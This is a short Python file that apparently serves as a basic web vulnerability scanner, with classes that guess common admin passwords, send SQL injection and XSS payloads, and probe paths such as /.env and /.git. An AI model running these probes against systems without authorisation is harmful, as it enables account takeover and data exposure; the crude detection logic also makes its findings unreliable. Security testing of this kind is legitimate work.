import requests

class ExploitBase:
    """ Base class for all exploits, containing common functionality. """
    def __init__(self, url):
        self.url = url

    def send_request(self, data):
        """ Helper method to send requests to the server. """
        try:
            response = requests.post(self.url, data=data)
            return response.text
        except requests.RequestException as e:
            return str(e)

class WeakPasswordExploit(ExploitBase):
    """ Exploit for testing common weak passwords. """
    common_passwords = ['123456', 'password', 'admin', 'letmein']

    def run(self):
        for password in self.common_passwords:
            response = self.send_request({'username': 'admin', 'password': password})
            if "Welcome" in response:
                return f"Weak password found: {password}", "red"
        return "No weak passwords succeeded.", "green"

class SQLInjectionExploit(ExploitBase):
    """ Exploit for testing SQL injection vulnerabilities. """
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"]

    def run(self):
        for payload in self.payloads:
            response = self.send_request({'username': payload, 'password': 'password'})
            if "error" not in response:
                return "SQL Injection vulnerability detected!", "red"
        return "No SQL Injection vulnerabilities detected.", "green"

class XSSAttackExploit(ExploitBase):
    """ Exploit for testing XSS vulnerabilities. """
    payloads = ["<script>alert('XSS')</script>", "<img src='invalid' onerror='alert(\"XSS\")'>"]

    def run(self):
        for payload in self.payloads:
            response = self.send_request({'data': payload})
            if payload in response:
                return "XSS vulnerability detected!", "red"
        return "No XSS vulnerabilities detected.", "green"

class SensitivePathsExploit(ExploitBase):
    """ Exploit for discovering accessible sensitive directories or files. """
    paths = ["/admin", "/config", "/db", "/.env", "/.git"]

    def run(self):
        for path in self.paths:
            full_url = f"{self.url}{path}"
            response = requests.get(full_url)
            if response.status_code == 200:
                return f"Sensitive path accessible: {path}", "red"
        return "No accessible sensitive paths found.", "green"
